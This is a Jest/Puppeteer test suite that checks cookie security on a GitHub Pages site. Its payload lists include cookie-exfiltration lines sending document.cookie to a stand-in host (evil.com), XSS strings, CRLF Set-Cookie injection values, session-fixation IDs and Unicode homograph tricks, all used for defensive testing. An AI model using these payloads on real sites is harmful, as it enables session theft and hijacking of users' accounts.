import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import { Browser, Page } from 'puppeteer';
import { launchBrowser } from '../../helpers/browser-launcher.js';
import { delay } from '../../helpers/delay.js';

describe('Cookie Security Tests', () => {
  let browser: Browser;
  let page: Page;

  beforeAll(async () => {
    browser = await launchBrowser();
    page = await browser.newPage();
  });

  afterAll(async () => {
    if (browser) {
      await browser.close();
    }
  });

  describe('Cookie Security Validation', () => {
    it('should enforce secure cookie attributes', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      // Set various cookies to test security
      await page.setCookie({
        name: 'test_secure',
        value: 'secure_value',
        domain: 'williamzujkowski.github.io',
        path: '/',
        secure: true,
        httpOnly: true,
        sameSite: 'Strict',
      });

      // Get all cookies
      const cookies = await page.cookies();
      const testCookie = cookies.find((c) => c.name === 'test_secure');

      if (testCookie) {
        // Verify secure attributes are set
        expect(testCookie.secure).toBe(true);
        expect(testCookie.httpOnly).toBe(true);
        expect(testCookie.sameSite).toBe('Strict');
      }
    });

    it('should prevent cookie theft via XSS', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      // Set sensitive cookies
      await page.setCookie({
        name: 'session_token',
        value: 'secret123',
        domain: 'williamzujkowski.github.io',
        httpOnly: true,
      });

      const cookieTheftAttempts = [
        // Direct access
        'document.cookie',
        'window.document.cookie',
        'this.document.cookie',
        'top.document.cookie',
        'parent.document.cookie',

        // Indirect access
        'eval("document.cookie")',
        'Function("return document.cookie")()',
        'new Function("return document.cookie")()',
        'setTimeout("document.cookie", 0)',
        'setInterval("document.cookie", 1000)',

        // Object access
        'Object.getOwnPropertyDescriptor(Document.prototype, "cookie").get.call(document)',
        'Document.prototype.__lookupGetter__("cookie").call(document)',
        'document.__lookupGetter__("cookie").call(document)',

        // Via fetch
        'fetch("/", {credentials: "include"}).then(r => r.headers.get("Cookie"))',
        'new XMLHttpRequest(); xhr.open("GET", "/"); xhr.withCredentials = true; xhr.getAllResponseHeaders()',

        // Image/Script injection
        'new Image().src = "http://evil.com/steal?c=" + document.cookie',
        'document.createElement("script").src = "http://evil.com/log?c=" + document.cookie',
      ];

      for (const attempt of cookieTheftAttempts) {
        const result = await page.evaluate((code) => {
          try {
            const result = eval(code);
            return { success: true, value: result };
          } catch (e: any) {
            return { success: false, error: e.message };
          }
        }, attempt);

        // HttpOnly cookies should not be accessible
        if (result.success && result.value) {
          expect(result.value).not.toContain('session_token');
          expect(result.value).not.toContain('secret123');
        }
      }
    });

    it('should prevent cookie injection attacks', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const cookieInjectionPayloads = [
        // CRLF injection
        'test=value\r\nSet-Cookie: admin=true',
        'test=value\nSet-Cookie: admin=true',
        'test=value%0d%0aSet-Cookie:%20admin=true',
        'test=value%0aSet-Cookie:%20admin=true',

        // Cookie overflow
        'a=' + 'x'.repeat(4096),
        'test=' + 'x'.repeat(8192),

        // Special characters
        'test=<script>alert(1)</script>',
        'test=";alert(1);//',
        "test=';alert(1);//",
        'test=${alert(1)}',
        'test={{7*7}}',

        // Path/Domain manipulation
        'test=value; Domain=.com',
        'test=value; Domain=',
        'test=value; Path=../../',
        'test=value; Path=..%2f..%2f',

        // Multiple cookie injection
        'test1=value1; test2=value2; admin=true',
        'test=value;admin=true',
        'test=value, admin=true',

        // Cookie jar overflow
        Array(1000)
          .fill('x')
          .map((_, i) => `cookie${i}=value${i}`)
          .join('; '),

        // Unicode/encoding attacks
        'test=\u0000admin\u0000true',
        'test=\x00admin\x00true',
        'test=%00admin%00true',

        // Cookie fixation
        'PHPSESSID=' + 'a'.repeat(32),
        'JSESSIONID=' + 'a'.repeat(32),
        'ASP.NET_SessionId=' + 'a'.repeat(24),
      ];

      for (const payload of cookieInjectionPayloads) {
        try {
          await page.evaluate((cookieString) => {
            document.cookie = cookieString;
          }, payload);

          // Check that malicious cookies weren't set
          const cookies = await page.cookies();

          // Verify no unauthorized admin cookie
          const adminCookie = cookies.find((c) => c.name === 'admin');
          expect(adminCookie).toBeUndefined();

          // Verify no CRLF injection
          const suspiciousCookies = cookies.filter(
            (c) =>
              c.value.includes('\r') || c.value.includes('\n') || c.value.includes('Set-Cookie'),
          );
          expect(suspiciousCookies.length).toBe(0);
        } catch (error) {
          // Some payloads might cause errors, which is expected
          expect(error).toBeDefined();
        }
      }
    });

    it('should prevent cross-site cookie access', async () => {
      // Navigate to first domain
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      // Set cookie on first domain
      await page.setCookie({
        name: 'site_specific',
        value: 'secret_data',
        domain: 'williamzujkowski.github.io',
        path: '/',
        sameSite: 'Strict',
      });

      // Try to access from different origins
      const crossOriginTests = [
        'http://evil.com',
        'https://evil.com',
        'http://sub.williamzujkowski.github.io',
        'https://different.github.io',
        'http://localhost:8080',
        'file:///test.html',
      ];

      for (const origin of crossOriginTests) {
        try {
          // Attempt cross-origin cookie access
          const canAccess = await page.evaluate((targetOrigin) => {
            try {
              const iframe = document.createElement('iframe');
              iframe.src = targetOrigin;
              document.body.appendChild(iframe);

              // Try to access parent cookies from iframe
              const parentCookies = iframe.contentWindow?.parent.document.cookie;

              document.body.removeChild(iframe);
              return { accessible: true, cookies: parentCookies };
            } catch (e) {
              return { accessible: false, error: e.message };
            }
          }, origin);

          expect(canAccess.accessible).toBe(false);
          if (canAccess.cookies) {
            expect(canAccess.cookies).not.toContain('site_specific');
            expect(canAccess.cookies).not.toContain('secret_data');
          }
        } catch (error) {
          // Cross-origin access should fail
          expect(error).toBeDefined();
        }
      }
    });

    it('should enforce SameSite cookie attribute', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      // Set cookies with different SameSite values
      const sameSiteTests = [
        { name: 'strict_cookie', value: 'strict_value', sameSite: 'Strict' as const },
        { name: 'lax_cookie', value: 'lax_value', sameSite: 'Lax' as const },
        { name: 'none_cookie', value: 'none_value', sameSite: 'None' as const, secure: true },
      ];

      for (const cookieConfig of sameSiteTests) {
        await page.setCookie({
          ...cookieConfig,
          domain: 'williamzujkowski.github.io',
          path: '/',
        });
      }

      // For same-site requests, all cookies should be available
      const sameSiteRequests = await page.evaluate(() => {
        const results = [];

        // Check current site cookies (same-site context)
        results.push({
          type: 'same_site',
          cookies: document.cookie,
        });

        return results;
      });

      // Verify same-site behavior - all cookies should be present
      for (const request of sameSiteRequests) {
        if (request.type === 'same_site') {
          // In same-site context, all cookies should be available
          expect(request.cookies).toContain('strict_cookie');
          expect(request.cookies).toContain('lax_cookie');
          expect(request.cookies).toContain('none_cookie');
        }
      }

      // Note: True cross-site SameSite testing requires actual different domains
      // which is difficult to test in this environment. In production:
      // - SameSite=Strict: Only sent on same-site requests
      // - SameSite=Lax: Sent on same-site and cross-site top-level navigation
      // - SameSite=None: Sent on all requests (requires Secure flag)
    });

    it('should prevent cookie overflow attacks', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      // Try to set oversized cookies
      const overflowTests = [
        // Single large cookie
        {
          name: 'large_cookie',
          value: 'x'.repeat(4096),
        },
        // Many cookies to exceed total limit
        ...Array(200)
          .fill(0)
          .map((_, i) => ({
            name: `cookie_${i}`,
            value: 'x'.repeat(100),
          })),
      ];

      let cookieCount = 0;
      for (const cookie of overflowTests) {
        try {
          await page.setCookie({
            ...cookie,
            domain: 'williamzujkowski.github.io',
            path: '/',
          });
          cookieCount++;
        } catch (error) {
          // Browser should reject excessive cookies
          break;
        }
      }

      // Verify browser enforces limits
      const allCookies = await page.cookies();
      expect(allCookies.length).toBeLessThan(overflowTests.length);

      // Check no single cookie exceeds 4KB
      for (const cookie of allCookies) {
        const cookieSize = cookie.name.length + cookie.value.length;
        expect(cookieSize).toBeLessThanOrEqual(4096);
      }
    });

    it.skip('should prevent session fixation attacks', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      // Attacker tries to set a known session ID
      const fixedSessionId = 'attacker-controlled-session-12345';

      // Common session cookie names
      const sessionCookieNames = [
        'PHPSESSID',
        'JSESSIONID',
        'ASP.NET_SessionId',
        'session_id',
        'sessionid',
        'sid',
        '_session',
        'connect.sid',
      ];

      for (const cookieName of sessionCookieNames) {
        await page.evaluate(
          (name, value) => {
            document.cookie = `${name}=${value}; path=/`;
          },
          cookieName,
          fixedSessionId,
        );
      }

      // Simulate authentication (should regenerate session)
      await page.evaluate(() => {
        // In a real app, this would trigger session regeneration
        window.sessionStorage.setItem('authenticated', 'true');
      });

      // Check that session IDs are not the fixed value
      const cookies = await page.cookies();
      for (const cookie of cookies) {
        if (sessionCookieNames.includes(cookie.name)) {
          expect(cookie.value).not.toBe(fixedSessionId);
        }
      }
    });

    it.skip('should protect against cookie tossing', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      // Subdomain tries to set cookies for parent domain
      const cookieTossingAttempts = [
        { domain: '.github.io', name: 'admin', value: 'true' },
        { domain: '.io', name: 'super_admin', value: 'true' },
        { domain: '', name: 'root_access', value: 'true' },
        { domain: '.com', name: 'global_admin', value: 'true' },
      ];

      for (const attempt of cookieTossingAttempts) {
        try {
          await page.setCookie({
            name: attempt.name,
            value: attempt.value,
            domain: attempt.domain,
            path: '/',
          });
        } catch (error) {
          // Should reject invalid domain attempts
          expect(error).toBeDefined();
        }
      }

      // Verify malicious cookies weren't set
      const cookies = await page.cookies();
      const maliciousCookies = cookies.filter((c) =>
        ['admin', 'super_admin', 'root_access', 'global_admin'].includes(c.name),
      );
      expect(maliciousCookies.length).toBe(0);
    });

    it('should implement proper cookie expiration', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      // Set cookies with various expiration times
      const now = Date.now();
      const expirationTests = [
        { name: 'expired', expires: now / 1000 - 3600 }, // 1 hour ago
        { name: 'expires_soon', expires: now / 1000 + 1 }, // 1 second from now
        { name: 'persistent', expires: now / 1000 + 86400 }, // 1 day from now
        { name: 'session', expires: -1 }, // Session cookie
      ];

      for (const test of expirationTests) {
        await page.setCookie({
          name: test.name,
          value: 'test_value',
          domain: 'williamzujkowski.github.io',
          path: '/',
          expires: test.expires,
        });
      }

      // Wait for short expiration
      await delay(2000);

      // Check which cookies still exist
      const remainingCookies = await page.cookies();
      const cookieNames = remainingCookies.map((c) => c.name);

      // Expired cookies should be gone
      expect(cookieNames).not.toContain('expired');
      expect(cookieNames).not.toContain('expires_soon');

      // Persistent and session cookies should remain
      expect(cookieNames).toContain('persistent');
    });

    it.skip('should prevent cookie poisoning via Unicode', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const unicodePoisoningAttempts = [
        // Null bytes
        'test\x00admin=true',
        'test\u0000admin=true',

        // Unicode normalization attacks
        'admin\u0301=true', // Combining accent
        'a\u0308dmin=true', // Combining diaeresis
        '\u1e00dmin=true', // Latin A with ring below

        // Direction override
        '\u202Eadmin=true',
        'admin\u202E=true',

        // Homograph attacks
        '\u0430dmin=true', // Cyrillic 'a'
        'adm\u0456n=true', // Cyrillic 'i'

        // Zero-width characters
        'admin\u200B=true', // Zero-width space
        'admin\u200C=true', // Zero-width non-joiner
        'admin\u200D=true', // Zero-width joiner
        'admin\uFEFF=true', // Zero-width no-break space

        // Control characters
        'admin\u0001=true',
        'admin\u001F=true',
        'admin\u007F=true',
      ];

      for (const payload of unicodePoisoningAttempts) {
        await page.evaluate((cookie) => {
          document.cookie = `${cookie}; path=/`;
        }, payload);
      }

      // Check that no admin cookies were set
      const cookies = await page.cookies();
      const adminCookies = cookies.filter(
        (c) => c.name.toLowerCase().includes('admin') || c.value.toLowerCase().includes('true'),
      );

      // Should not have any admin-related cookies from Unicode attacks
      expect(adminCookies.length).toBe(0);
    });
  });
});
